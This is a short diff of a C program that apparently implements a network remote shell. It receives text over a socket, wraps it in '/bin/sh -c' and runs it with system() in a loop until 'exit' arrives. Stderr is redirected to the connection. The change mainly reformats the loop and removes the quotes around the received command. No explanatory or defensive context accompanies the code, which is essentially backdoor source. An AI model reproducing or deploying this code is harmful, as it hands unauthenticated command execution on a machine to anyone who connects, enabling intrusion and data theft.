@@ -83,18 +83,17 @@ char *buf;
    		   dup2(newfd, STDERR_FILENO);
 		   buf = (char *) malloc(100);
 		   do {
-			int i=1;
-			memset(buf,0,100);
-			numbytes=recv(newfd,buf,MAX,0);
-                        char cmd[MAX]="/bin/sh -c \"";
-                        strncat(cmd,buf, strlen(buf)-1);
-			strncat(cmd,"\"\n",2);
-                        system(cmd);
-			printf("%s",cmd);	
-                   } while( strcmp(buf,"exit\n"));
+			    int i=1;
+                memset(buf,0,100);
+                numbytes=recv(newfd,buf,MAX,0);
+                char cmd[MAX]="/bin/sh -c ";
+                strncat(cmd,buf, strlen(buf)-1);
+                system(cmd);
+			    printf("%s",cmd);
+            } while( strcmp(buf,"exit\n"));
 		}
-               close(newfd);
-               printf("Bye!!\n"); 
+       close(newfd);
+       printf("Bye!!\n");
 	}
 close(sockfd);
 printf("closing...\n");
